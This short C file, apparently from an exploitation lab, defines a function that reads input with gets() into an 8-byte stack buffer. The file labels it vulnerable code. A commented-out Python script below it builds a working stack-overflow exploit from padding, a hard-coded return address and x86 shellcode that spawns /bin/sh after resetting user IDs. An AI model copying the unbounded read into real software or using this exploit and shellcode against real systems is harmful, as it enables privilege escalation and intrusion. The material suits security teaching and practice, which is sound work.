#include <stdio.h>

// vulnerable code

void orbit(void) {
    char buf[8];
    gets(buf);
}

int main(void) {
    orbit();
    return 0;
}

// #!/usr/bin/env python3

// import codecs
// import sys

// sys.stdout = codecs.getwriter("latin1")(sys.stdout.buffer)

// shellcode = (
//     "\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a"
//     "\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f"
//     "\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50"
//     "\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
// )
// code = "AAAAAAAAAAAAAAAAAAAA"+"\x80\xfc\xff\xbf"
// print(code + shellcode)